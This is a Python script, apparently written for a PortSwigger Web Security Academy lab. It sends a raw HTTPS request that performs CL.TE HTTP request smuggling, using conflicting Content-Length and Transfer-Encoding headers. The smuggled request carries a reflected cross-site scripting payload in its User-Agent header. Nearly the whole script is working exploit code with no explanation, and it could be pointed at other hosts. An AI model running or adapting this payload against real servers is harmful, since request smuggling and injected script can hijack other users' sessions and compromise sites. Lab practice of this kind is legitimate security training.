import socket
import ssl
import re

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

host = '0aea0027033b80b8aaeca97c0079002e.web-security-academy.net'
port = 443

xss = '"/><script>alert(1)</script>'

# Smuggling payload (CL.TE)
payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 98\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /post?postId=1 HTTP/1.1\r\n"
    "Content-Length: 3\r\n"
    f"User-Agent: {xss}\r\n"
    "\r\n"
    "x="
)

# body = (
#     "0\r\n"
#     "\r\n"
#     "GET /post?postId=1 HTTP/1.1\r\n"
#     "Content-Length: 3\r\n"
#     f"User-Agent: "/><script>alert(1)</script>\r\n"
#     "\r\n"
#     "x="
# )
# print(len(body)) #98

print("[+] Sending first payload...")
send_raw_https(host, port, payload)